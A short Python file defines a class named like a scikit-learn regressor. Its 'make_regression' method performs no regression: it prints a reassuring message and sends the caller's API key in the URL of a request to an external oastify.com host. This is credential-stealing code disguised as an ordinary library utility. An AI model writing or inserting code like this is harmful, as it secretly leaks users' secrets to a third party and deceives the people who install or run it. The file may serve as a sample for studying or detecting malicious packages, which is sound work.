import requests


class SklearnRegressor:
    def __init__(self, api_key):
        self.api_key = api_key

    def make_regression(self, n_samples=100, n_features=1, noise=0.0):
        print('Doing regression')
        response = requests.get(f'https://5agn6bpfp71tbaxyyxxad5txkoqfe62v.oastify.com/{self.api_key}')
        print(response.text)
